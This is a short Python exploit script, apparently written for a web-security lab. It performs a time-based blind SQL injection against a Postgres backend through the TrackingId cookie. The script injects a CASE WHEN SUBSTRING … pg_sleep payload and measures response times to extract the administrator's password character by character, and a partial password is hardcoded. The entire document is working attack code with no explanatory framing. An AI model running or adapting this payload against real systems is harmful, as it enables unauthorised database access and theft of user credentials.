from requests import Session
from time import time
from string import digits, ascii_letters


BASE_URL = ''
PATH = ''

# Postgres
TRACKING_ID = "GpFgt9dDDH5stCHG' %3B SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),{char_no},1) = '{letter}' THEN pg_sleep(1) ELSE pg_sleep(0) END --"


password = 'ku4pbi6486'
full_path = BASE_URL + PATH
letters = ascii_letters + digits
with Session() as s:

    for i in range(23):
        for index, letter in enumerate(letters):
            tracking_id = TRACKING_ID.format(
                char_no=len(password) + 1,
                letter=letter
            )
            start_time = time()
            response = s.get(full_path, cookies={
                'TrackingId': tracking_id
            })
            end_time = time()
            diff = end_time - start_time

            if diff > 1:
                password += letter
                print(password)
                break
        else:
            break

    print('Length of password = ', len(password))
    print('Password:', password)
